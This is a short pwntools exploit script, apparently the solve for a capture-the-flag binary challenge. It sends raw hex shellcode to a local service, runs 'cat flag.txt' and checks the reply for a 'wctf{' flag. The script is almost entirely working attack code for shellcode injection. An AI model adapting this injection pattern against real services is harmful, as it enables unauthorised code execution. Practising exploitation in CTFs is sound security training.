#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template chal
from pwn import *
from time import sleep

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX unknown - GNU_STACK missing
# PIE:      No PIE (0x400000)
# Stack:    Executable
# RWX:      Has RWX segments

io = remote('127.0.0.1', 1337) 

asciibytes = "b8 bd d0 c1 40 05 7e 2f 3e bf bc e1 60 11 3c 81 f4 e9 40 51 3c 8b fc"
shellcode = bytes.fromhex(asciibytes)
print(shellcode)
sleep(2)
io.sendline(shellcode)
sleep(2)
io.sendline(b"cat flag.txt")
sleep(2)
#io.interactive()
result = str(io.recv().decode('ascii'))
print(result)
if 'wctf{' in result:
  exit(0)
exit(1)
